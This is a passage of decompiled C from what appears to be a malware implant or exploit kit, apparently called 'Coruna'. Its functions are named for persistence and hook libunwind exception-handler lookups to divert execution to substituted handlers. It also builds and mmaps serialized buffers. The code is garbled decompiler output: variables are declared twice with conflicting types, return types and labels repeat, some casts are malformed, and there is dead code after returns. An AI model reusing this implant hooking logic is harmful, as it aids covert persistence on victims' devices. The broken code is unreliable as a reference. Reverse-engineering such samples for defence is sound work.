    if (scratch < 0x7a) {
      *(uint32_t *)(bootargs + (unsigned long)scratch + 3) = 0x29d019e;
      *(uint32_t *)(bootargs + scratch) = 0x9e101d0c;
      scratch = scratch + 7;
      err = '\x03';
next:
      if ((flags_2 & 1) == 0) {
retry:
        if ((flags_2 >> 1 & 1) == 0) {
found:
          if ((flags_2 >> 2 & 1) == 0) {
nomem:
            if ((flags_2 >> 3 & 1) == 0) {
invalid:
              if ((flags_2 >> 4 & 1) == 0) {
                if ((flags_2 >> 8 & 1) == 0) {
again:
                  if ((flags_2 >> 9 & 1) == 0) {
exit_ok:
                    if ((flags_2 >> 10 & 1) == 0) {
joined_r0x0001c454:
                      if ((flags_2 >> 0xb & 1) == 0) {
                        type_id_8 = 0;
                        u = 0;
                        if (type_id_8 != 0xad005) {
                        u = type_id_8;
                        }
                        if (kind != 0) {
                        u = kind;
                        }
                        port = (unsigned long)u;
                        *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
                        if (*(long *)k_persist_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                        buf = (long *)handle[2];
                        if ((buf == (long *)0x0) ||
                        ((handle = *buf, handle == 0 ||
                        (port = (unsigned long)*(uint *)(buf + 1), 0x4000 < scratch + *(uint *)(buf + 1))))) {
                        port = coruna_vec_push_pair(*handle + 0xe8,*handle + 0xf0);
                        if (*(long *)k_persist_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                        handle[2] = *(long *)(*handle + 0xe8) + (unsigned long)(*(int *)(*handle + 0xf0) - 1) * 0x10;
                        ptr = (void *)_mmap(0,0x4000,3,&k_persist_mmap_anon_fd,0xffffffff,0);
                        *(void **)handle[2] = ptr;
                        if (ptr == (void *)0xffffffffffffffff) {
                        port = 0xad009;
                        if (*(long *)k_persist_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                        }
                        _bzero(ptr,0x4000);
                        port = 0;
                        buf = (long *)handle[2];
                        *(uint32_t *)(buf + 1) = 0;
                        *(uint8_t *)((long)buf + 0xc) = 1;
                        handle = *buf;
                        }
                        coruna_persist_trampoline_00010010(handle + port,bootargs,scratch);
                        port = 0;
                        *(uint *)(handle[2] + 8) = *(int *)(handle[2] + 8) + scratch;
                        if (*(long *)k_persist_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                      }
                      bootargs[scratch] = 0xce;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xcf;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          type_id_8 = 0;
                          u = 0;
                          if (type_id_8 != 0xad005) {
                          u = type_id_8;
                          }
                          if (kind != 0) {
                          u = kind;
                          }
                          port = (unsigned long)u;
                          *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
                          if (*(long *)k_persist_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                          buf = (long *)handle[2];
                          if ((buf == (long *)0x0) ||
                          ((handle = *buf, handle == 0 ||
                          (port = (unsigned long)*(uint *)(buf + 1), 0x4000 < scratch + *(uint *)(buf + 1))))) {
                          port = coruna_vec_push_pair(*handle + 0xe8,*handle + 0xf0);
                          if (*(long *)k_persist_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                          handle[2] = *(long *)(*handle + 0xe8) + (unsigned long)(*(int *)(*handle + 0xf0) - 1) * 0x10;
                          ptr = (void *)_mmap(0,0x4000,3,&k_persist_mmap_anon_fd,0xffffffff,0);
                          *(void **)handle[2] = ptr;
                          if (ptr == (void *)0xffffffffffffffff) {
                          port = 0xad009;
                          if (*(long *)k_persist_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                          }
                          _bzero(ptr,0x4000);
                          port = 0;
                          buf = (long *)handle[2];
                          *(uint32_t *)(buf + 1) = 0;
                          *(uint8_t *)((long)buf + 0xc) = 1;
                          handle = *buf;
                          }
                          coruna_persist_trampoline_00010010(handle + port,bootargs,scratch);
                          port = 0;
                          *(uint *)(handle[2] + 8) = *(int *)(handle[2] + 8) + scratch;
                          if (*(long *)k_persist_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                        }
                      }
                    }
                    else {
                      bootargs[scratch] = 0xcc;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xcd;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          err = err + '\x02';
                          goto joined_r0x0001c454;
                        }
                      }
                    }
                  }
                  else {
                    bootargs[scratch] = 0xca;
                    type_id_8 = scratch + 1;
                    if (type_id_8 < scratch + 2) {
                      bootargs[type_id_8] = err;
                      bootargs[scratch + 2] = 0xcb;
                      type_id_8 = scratch + 3;
                      scratch = scratch + 4;
                      if (type_id_8 < scratch) {
                        bootargs[type_id_8] = err + '\x01';
                        err = err + '\x02';
                        goto exit_ok;
                      }
                    }
                  }
                }
                else {
load_ok:
                  bootargs[scratch] = 200;
                  type_id_8 = scratch + 1;
                  if (type_id_8 < scratch + 2) {
                    bootargs[type_id_8] = err;
                    bootargs[scratch + 2] = 0xc9;
                    type_id_8 = scratch + 3;
                    scratch = scratch + 4;
                    if (type_id_8 < scratch) {
                      bootargs[type_id_8] = err + '\x01';
                      err = err + '\x02';
                      if ((flags_2 >> 9 & 1) == 0) goto exit_ok;
                    }
                  }
                }
              }
              else {
                bootargs[scratch] = 0x9b;
                type_id_8 = scratch + 1;
                if (type_id_8 < scratch + 2) {
                  bootargs[type_id_8] = err;
                  bootargs[scratch + 2] = 0x9c;
                  type_id_8 = scratch + 3;
                  scratch = scratch + 4;
                  if (type_id_8 < scratch) {
                    bootargs[type_id_8] = err + '\x01';
                    err = err + '\x02';
                    if ((flags_2 >> 8 & 1) != 0) {
                      bootargs[scratch] = 200;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xc9;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          err = err + '\x02';
                          if ((flags_2 >> 9 & 1) == 0) goto exit_ok;
                        }
                      }
                    }
                    else if ((flags_2 >> 9 & 1) == 0) goto exit_ok;
                  }
                }
              }
            }
            else {
              bootargs[scratch] = 0x99;
              type_id_8 = scratch + 1;
              if (type_id_8 < scratch + 2) {
                bootargs[type_id_8] = err;
                bootargs[scratch + 2] = 0x9a;
                type_id_8 = scratch + 3;
                scratch = scratch + 4;
                if (type_id_8 < scratch) {
                  bootargs[type_id_8] = err + '\x01';
                  err = err + '\x02';
                  if ((flags_2 >> 4 & 1) == 0) {
                    if ((flags_2 >> 8 & 1) == 0) goto exit_ok;
                  }
                }
              }
            }
          }
          else {
            bootargs[scratch] = 0x97;
            type_id_8 = scratch + 1;
            if (type_id_8 < scratch + 2) {
              bootargs[type_id_8] = err;
              bootargs[scratch + 2] = 0x98;
              type_id_8 = scratch + 3;
              scratch = scratch + 4;
              if (type_id_8 < scratch) {
                bootargs[type_id_8] = err + '\x01';
                err = err + '\x02';
                if ((flags_2 >> 3 & 1) == 0) {
                  bootargs[scratch] = 0x99;
                  type_id_8 = scratch + 1;
                  if (type_id_8 < scratch + 2) {
                    bootargs[type_id_8] = err;
                    bootargs[scratch + 2] = 0x9a;
                    type_id_8 = scratch + 3;
                    scratch = scratch + 4;
                    if (type_id_8 < scratch) {
                      bootargs[type_id_8] = err + '\x01';
                      err = err + '\x02';
                      if ((flags_2 >> 4 & 1) == 0) {
                        if ((flags_2 >> 8 & 1) == 0) goto exit_ok;
                      }
                    }
                  }
                }
              }
            }
          }
        }
        else {
          bootargs[scratch] = 0x95;
          type_id_8 = scratch + 1;
          if (type_id_8 < scratch + 2) {
            bootargs[type_id_8] = err;
            bootargs[scratch + 2] = 0x96;
            type_id_8 = scratch + 3;
            scratch = scratch + 4;
            if (type_id_8 < scratch) {
              bootargs[type_id_8] = err + '\x01';
              err = err + '\x02';
              if ((flags_2 >> 2 & 1) == 0) {
                if ((flags_2 >> 3 & 1) == 0) {
                  bootargs[scratch] = 0x99;
                  type_id_8 = scratch + 1;
                  if (type_id_8 < scratch + 2) {
                    bootargs[type_id_8] = err;
                    bootargs[scratch + 2] = 0x9a;
                    type_id_8 = scratch + 3;
                    scratch = scratch + 4;
                    if (type_id_8 < scratch) {
                      bootargs[type_id_8] = err + '\x01';
                      err = err + '\x02';
                      if ((flags_2 >> 4 & 1) == 0) {
                        if ((flags_2 >> 8 & 1) == 0) goto exit_ok;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      else {
        bootargs[scratch] = 0x93;
        type_id_8 = scratch + 1;
        if (type_id_8 < scratch + 2) {
          bootargs[type_id_8] = err;
          bootargs[scratch + 2] = 0x94;
          type_id_8 = scratch + 3;
          scratch = scratch + 4;
          if (type_id_8 < scratch) {
            bootargs[type_id_8] = err + '\x01';
            err = err + '\x02';
            if ((flags_2 >> 1 & 1) == 0) {
              if ((flags_2 >> 2 & 1) == 0) {
                if ((flags_2 >> 3 & 1) == 0) {
                  bootargs[scratch] = 0x99;
                  type_id_8 = scratch + 1;
                  if (type_id_8 < scratch + 2) {
                    bootargs[type_id_8] = err;
                    bootargs[scratch + 2] = 0x9a;
                    type_id_8 = scratch + 3;
                    scratch = scratch + 4;
                    if (type_id_8 < scratch) {
                      bootargs[type_id_8] = err + '\x01';
                      err = err + '\x02';
                      if ((flags_2 >> 4 & 1) == 0) {
                        if ((flags_2 >> 8 & 1) == 0) goto exit_ok;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
skip:
      scratch = type_id_8;
      type_id_8 = 0xad001;
    }
    else {
      type_id_8 = 0xad00c;
    }
  }
  else {
    err = '\0';
    type_id_8 = 0;
check_ok:
    if ((u == 0x4000000) || (u == 0x2000000)) {
      if (type_id_8 == 0) goto next;
    }
    else {
      type_id_8 = 0xad005;
      if (u != 0x3000000) {
        type_id_8 = 0xad014;
      }
    }
  }
parse_ok:
  u = 0;
  if (type_id_8 != 0xad005) {
    u = type_id_8;
  }
  if (kind != 0) {
    u = kind;
  }
  port = (unsigned long)u;
  *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
  if (*(long *)k_persist_stack_chk_guard_slot == action) {
  return;
  }
  ___stack_chk_fail(port);
  buf = (long *)handle[2];
  if ((buf == (long *)0x0) ||
     ((handle = *buf, handle == 0 ||
      (port = (unsigned long)*(uint *)(buf + 1), 0x4000 < scratch + *(uint *)(buf + 1))))) {
    port = coruna_vec_push_pair(*handle + 0xe8,*handle + 0xf0);
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(port);
    handle[2] = *(long *)(*handle + 0xe8) + (unsigned long)(*(int *)(*handle + 0xf0) - 1) * 0x10;
    ptr = (void *)_mmap(0,0x4000,3,&k_persist_mmap_anon_fd,0xffffffff,0);
    *(void **)handle[2] = ptr;
    if (ptr == (void *)0xffffffffffffffff) {
      port = 0xad009;
      if (*(long *)k_persist_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(port);
    }
    _bzero(ptr,0x4000);
    port = 0;
    buf = (long *)handle[2];
    *(uint32_t *)(buf + 1) = 0;
    *(uint8_t *)((long)buf + 0xc) = 1;
    handle = *buf;
  }
  coruna_persist_trampoline_00010010(handle + port,bootargs,scratch);
  port = 0;
  *(uint *)(handle[2] + 8) = *(int *)(handle[2] + 8) + scratch;
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(port);
}





uint64_t
uint64_t coruna_persist_residual_50(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2, void* arg_x)
{
  uint32_t u;
  uint size;
  int *err;
  uint64_t version;
  int err;
  int *status;
  
  if (arg == 0) {
    return 0xad001;
  }
  if (arg_x == (void (*)0x0) {
    return 0xad001;
  }
  if (((uint)id_2 >> 0x1e & 1) != 0) {
    if (*(int *)(arg + 0x18) != 0) {
      err = (int *)(arg + (unsigned long)*(uint *)(arg + 8));
      do {
        status = err;
        err = status + 2;
      } while (*status != (int)val &&
               status < (int *)(arg +
                               (unsigned long)*(uint *)(arg + (unsigned long)*(uint *)(arg + 0x14) +
                                                (unsigned long)(*(int *)(arg + 0x18) - 1) * 0xc + 8)));
      if (*status == (int)val) {
        err = status[1];
        size = (uint)id_2 >> 0x1c & 3;
        u = 0;
        if (size != 0) {
        size = size - 1;
        if (*(uint *)(arg + 0x10) <= size) {
        return 0xad014;
        }
        u = *(uint32_t *)(arg + (unsigned long)*(uint *)(arg + 0xc) + (unsigned long)size * 4);
        }
        version = (*arg_x)(val,id_2,err,u,0);
        return version;
      }
    }
    return 0xad014;
  }
  err = 0;
fail:
  size = (uint)id_2 >> 0x1c & 3;
  u = 0;
  if (size != 0) {
    size = size - 1;
    if (*(uint *)(arg + 0x10) <= size) {
      return 0xad014;
    }
    u = *(uint32_t *)(arg + (unsigned long)*(uint *)(arg + 0xc) + (unsigned long)size * 4);
  }
  version = (*arg_x)(val,id_2,err,u,0);
  return version;
}





uint64_t
uint64_t coruna_libunwind_lsda_lookup(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, unw_cursor_t *arg)
{
  uint u;
  uint size;
  uint version;
  bool err;
  int err;
  unw_word_t *ptr;
  uint64_t port;
  long handle;
  int *err;
  long addr;
  unsigned long tag;
  long *ptr;
  void (*ptr)(void);
  unw_proc_info_t scratch;
  unw_word_t bootargs;
  
  if (arg == (unw_cursor_t *)0x0) {
    return 0;
  }
  scratch.extra = 0;
  scratch.flags = 0;
  scratch.gp = 0;
  scratch.unwind_info = 0;
  scratch.format = 0;
  scratch.unwind_info_size = 0;
  scratch.end_ip = 0;
  scratch.start_ip = 0;
  scratch.handler = 0;
  scratch.lsda = 0;
  err = _unw_get_proc_info(arg,&scratch);
  if (err != 0) {
    return 0;
  }
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  if (err != 0) {
    return 0;
  }
  bootargs = 0;
  err = coruna_find_libunwind_image(&bootargs);
  if (((err == 0) && (bootargs != 0)) && (err = *(int *)(bootargs + 0x10), err != 0)) {
    err = (int *)(bootargs + 0x20);
    do {
      if (*err == 0x2a) {
        err = (int)(scratch.lsda >> 0x20);
        if (*(unsigned long *)(err + 2) < 0x6402200000000) {
          bootargs = scratch.lsda;
          if (k_persist_rodata_word_24590 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_persist_rodata_word_24590 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto fail;
            }
          }
        }
        else {
          bootargs = scratch.lsda;
          if (k_persist_rodata_word_24590 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_persist_rodata_word_24590 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto done;
            }
          }
        }
        break;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (handle = *(long *)(handle + 0x38), handle != 0) {
done:
    handle = handle - ptr[4];
    if (((*(uint *)(handle + 0x4c) == u) && (*(int *)(handle + 0x48) == 8)) &&
       (**(unw_word_t **)(handle + 0x40) == scratch.lsda)) {
      if (k_persist_rodata_word_24598 != 0) {
        err = (uint)*(byte *)(handle + 0x17) * 0x1000000 + -0x61c88647 +
                (uint)*(byte *)(handle + 0x16) * 0x10000 + (uint)*(byte *)(handle + 0x15) * 0x100 +
                (uint)*(byte *)(handle + 0x14);
        u = (((uint)*(byte *)(handle + 0x13) * 0x1000000 + -0x60b6453e) - err) +
                (uint)*(byte *)(handle + 0x12) * 0x10000 + (uint)*(byte *)(handle + 0x11) * 0x100 +
                (uint)*(byte *)(handle + 0x10) ^ 0x7f76d;
        size = (err + 0x1124109) - u ^ u << 8;
        version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
        u = u - (size + version) ^ version >> 0xc;
        size = size - (version + u) ^ u << 0x10;
        version = version - (u + size) ^ size >> 5;
        u = u - (size + version) ^ version >> 3;
        size = size - (version + u) ^ u << 10;
        u = version - (u + size) ^ size >> 0xf;
        ptr = *(long **)(k_persist_rodata_word_24598 + 0x10);
        addr = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
        if (addr != 0) {
          goto check_ok;
        }
      }
      break;
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (addr = *(long *)(addr + 0x30), addr != 0) {
check_ok:
    addr = addr - ptr[4];
    if (((*(uint *)(addr + 0x44) == u) && (*(int *)(addr + 0x40) == 8)) &&
       (**(long **)(addr + 0x38) == *(long *)(handle + 0x10))) {
      if (scratch.extra == 0) {
        tag = 0;
        do {
          ptr = (unw_word_t *)((long)arg->data + tag);
          if (scratch.start_ip != *ptr) {
            ptr = (unw_word_t *)0x0;
          }
        } while ((ptr == (unw_word_t *)0x0) &&
                (err = tag < 0x590, tag = tag + 8, err));
        if (ptr == (unw_word_t *)0x0) break;
        ptr[8] = *(unw_word_t *)(handle + 8);
      }
      ptr = *(void (**)(addr + 8);
      goto skip;
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (handle = *(long *)(handle + 0x38), handle != 0) {
fail:
    handle = handle - ptr[4];
    if (((*(uint *)(handle + 0x4c) == u) && (*(int *)(handle + 0x48) == 8)) &&
       (**(unw_word_t **)(handle + 0x40) == scratch.lsda)) {
      if (k_persist_rodata_word_24598 != 0) {
        err = (uint)*(byte *)(handle + 0x17) * 0x1000000 + -0x61c88647 +
                (uint)*(byte *)(handle + 0x16) * 0x10000 + (uint)*(byte *)(handle + 0x15) * 0x100 +
                (uint)*(byte *)(handle + 0x14);
        u = (((uint)*(byte *)(handle + 0x13) * 0x1000000 + -0x60b6453e) - err) +
                (uint)*(byte *)(handle + 0x12) * 0x10000 + (uint)*(byte *)(handle + 0x11) * 0x100 +
                (uint)*(byte *)(handle + 0x10) ^ 0x7f76d;
        size = (err + 0x1124109) - u ^ u << 8;
        version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
        u = u - (size + version) ^ version >> 0xc;
        size = size - (version + u) ^ u << 0x10;
        version = version - (u + size) ^ size >> 5;
        u = u - (size + version) ^ version >> 3;
        size = size - (version + u) ^ u << 10;
        u = version - (u + size) ^ size >> 0xf;
        ptr = *(long **)(k_persist_rodata_word_24598 + 0x10);
        addr = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
        if (addr != 0) {
          goto next;
        }
      }
      break;
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (addr = *(long *)(addr + 0x30), addr != 0) {
next:
    addr = addr - ptr[4];
    if (((*(uint *)(addr + 0x44) == u) && (*(int *)(addr + 0x40) == 8)) &&
       (**(long **)(addr + 0x38) == *(long *)(handle + 0x10))) {
      if (scratch.extra == 0) {
        ptr = _memmem(arg,0x598,&scratch,0x48);
        if (ptr == (unw_word_t *)0x0) break;
        scratch.extra = *(unw_word_t *)(handle + 8);
        ptr[5] = scratch.flags;
        ptr[4] = scratch.gp;
        ptr[7] = scratch.unwind_info;
        ptr[6] = scratch;
        ptr[3] = scratch.handler;
        ptr[2] = scratch.lsda;
        ptr[1] = scratch.end_ip;
        *ptr = scratch.start_ip;
        ptr[8] = scratch.extra;
      }
      ptr = *(void (**)(addr + 8);
skip:
      _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
      port = (*ptr)(val,id_2,size_3,off_4,arg);
      return port;
    }
  }
cleanup:
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
}





uint64_t
uint64_t coruna_unw_get_proc_info(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, unw_cursor_t *arg)
{
  uint u;
  uint size;
  uint version;
  bool err;
  int err;
  unw_word_t *ptr;
  uint64_t port;
  long handle;
  int *err;
  long addr;
  unsigned long tag;
  long *ptr;
  void (*ptr)(void);
  unw_proc_info_t scratch;
  unw_word_t bootargs;
  
  scratch.extra = 0;
  scratch.flags = 0;
  scratch.gp = 0;
  scratch.unwind_info = 0;
  scratch.format = 0;
  scratch.unwind_info_size = 0;
  scratch.end_ip = 0;
  scratch.start_ip = 0;
  scratch.handler = 0;
  scratch.lsda = 0;
  err = _unw_get_proc_info(arg,&scratch);
  if (err != 0) {
    return 0;
  }
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  if (err != 0) {
    return 0;
  }
  bootargs = 0;
  err = coruna_find_libunwind_image(&bootargs);
  if (((err == 0) && (bootargs != 0)) && (err = *(int *)(bootargs + 0x10), err != 0)) {
    err = (int *)(bootargs + 0x20);
    do {
      if (*err == 0x2a) {
        err = (int)(scratch.lsda >> 0x20);
        if (*(unsigned long *)(err + 2) < 0x6402200000000) {
          bootargs = scratch.lsda;
          if (k_persist_rodata_word_24590 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_persist_rodata_word_24590 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto fail;
            }
          }
        }
        else {
          bootargs = scratch.lsda;
          if (k_persist_rodata_word_24590 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_persist_rodata_word_24590 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto done;
            }
          }
        }
        break;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (handle = *(long *)(handle + 0x38), handle != 0) {
done:
    handle = handle - ptr[4];
    if (((*(uint *)(handle + 0x4c) == u) && (*(int *)(handle + 0x48) == 8)) &&
       (**(unw_word_t **)(handle + 0x40) == scratch.lsda)) {
      if (k_persist_rodata_word_24598 != 0) {
        err = (uint)*(byte *)(handle + 0x17) * 0x1000000 + -0x61c88647 +
                (uint)*(byte *)(handle + 0x16) * 0x10000 + (uint)*(byte *)(handle + 0x15) * 0x100 +
                (uint)*(byte *)(handle + 0x14);
        u = (((uint)*(byte *)(handle + 0x13) * 0x1000000 + -0x60b6453e) - err) +
                (uint)*(byte *)(handle + 0x12) * 0x10000 + (uint)*(byte *)(handle + 0x11) * 0x100 +
                (uint)*(byte *)(handle + 0x10) ^ 0x7f76d;
        size = (err + 0x1124109) - u ^ u << 8;
        version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
        u = u - (size + version) ^ version >> 0xc;
        size = size - (version + u) ^ u << 0x10;
        version = version - (u + size) ^ size >> 5;
        u = u - (size + version) ^ version >> 3;
        size = size - (version + u) ^ u << 10;
        u = version - (u + size) ^ size >> 0xf;
        ptr = *(long **)(k_persist_rodata_word_24598 + 0x10);
        addr = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
        if (addr != 0) {
          goto check_ok;
        }
      }
      break;
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (addr = *(long *)(addr + 0x30), addr != 0) {
check_ok:
    addr = addr - ptr[4];
    if (((*(uint *)(addr + 0x44) == u) && (*(int *)(addr + 0x40) == 8)) &&
       (**(long **)(addr + 0x38) == *(long *)(handle + 0x10))) {
      if (scratch.extra == 0) {
        tag = 0;
        do {
          ptr = (unw_word_t *)((long)arg->data + tag);
          if (scratch.start_ip != *ptr) {
            ptr = (unw_word_t *)0x0;
          }
        } while ((ptr == (unw_word_t *)0x0) &&
                (err = tag < 0x590, tag = tag + 8, err));
        if (ptr == (unw_word_t *)0x0) break;
        ptr[8] = *(unw_word_t *)(handle + 8);
      }
      ptr = *(void (**)(addr + 8);
      goto skip;
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (handle = *(long *)(handle + 0x38), handle != 0) {
fail:
    handle = handle - ptr[4];
    if (((*(uint *)(handle + 0x4c) == u) && (*(int *)(handle + 0x48) == 8)) &&
       (**(unw_word_t **)(handle + 0x40) == scratch.lsda)) {
      if (k_persist_rodata_word_24598 != 0) {
        err = (uint)*(byte *)(handle + 0x17) * 0x1000000 + -0x61c88647 +
                (uint)*(byte *)(handle + 0x16) * 0x10000 + (uint)*(byte *)(handle + 0x15) * 0x100 +
                (uint)*(byte *)(handle + 0x14);
        u = (((uint)*(byte *)(handle + 0x13) * 0x1000000 + -0x60b6453e) - err) +
                (uint)*(byte *)(handle + 0x12) * 0x10000 + (uint)*(byte *)(handle + 0x11) * 0x100 +
                (uint)*(byte *)(handle + 0x10) ^ 0x7f76d;
        size = (err + 0x1124109) - u ^ u << 8;
        version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
        u = u - (size + version) ^ version >> 0xc;
        size = size - (version + u) ^ u << 0x10;
        version = version - (u + size) ^ size >> 5;
        u = u - (size + version) ^ version >> 3;
        size = size - (version + u) ^ u << 10;
        u = version - (u + size) ^ size >> 0xf;
        ptr = *(long **)(k_persist_rodata_word_24598 + 0x10);
        addr = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
        if (addr != 0) {
          goto next;
        }
      }
      break;
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
  while (addr = *(long *)(addr + 0x30), addr != 0) {
next:
    addr = addr - ptr[4];
    if (((*(uint *)(addr + 0x44) == u) && (*(int *)(addr + 0x40) == 8)) &&
       (**(long **)(addr + 0x38) == *(long *)(handle + 0x10))) {
      if (scratch.extra == 0) {
        ptr = _memmem(arg,0x598,&scratch,0x48);
        if (ptr == (unw_word_t *)0x0) break;
        scratch.extra = *(unw_word_t *)(handle + 8);
        ptr[5] = scratch.flags;
        ptr[4] = scratch.gp;
        ptr[7] = scratch.unwind_info;
        ptr[6] = scratch;
        ptr[3] = scratch.handler;
        ptr[2] = scratch.lsda;
        ptr[1] = scratch.end_ip;
        *ptr = scratch.start_ip;
        ptr[8] = scratch.extra;
      }
      ptr = *(void (**)(addr + 8);
skip:
      _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
      port = (*ptr)(val,id_2,size_3,off_4,arg);
      return port;
    }
  }
cleanup:
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
  return 0;
}





uint64_t coruna_sign_extend_uleb(unsigned long *arg,long handle,uint *size,unsigned long arg)
{
  uint64_t u;
  unsigned long scratch;
  unsigned long bootargs;
  
  scratch = 0;
  bootargs = 0;
  u = 0xad001;
  if ((((arg != (unsigned long *)0x0) && (handle != 0)) && (size != (uint *)0x0)) &&
     ((*size < arg &&
      (u = coruna_read_uleb128(&bootargs,&scratch,handle,size,arg), (int)u == 0)))) {
    if ((*(byte *)(handle + (unsigned long)(*size - 1)) >> 6 & 1) == 0) {
      u = 0;
    }
    else {
      u = 0;
      *arg = bootargs | -1L << (scratch & 0x3f);
    }
  }
  return u;
}





uint64_t
uint64_t coruna_msu_mnt1_path(uint64_t *val,uint size,int64_t arg,uint *flags_2,uint64_t id_2,int flags)
{
  unsigned long *ptr;
  uint u;
  unsigned long size;
  bool err;
  uint64_t version;
  uint port;
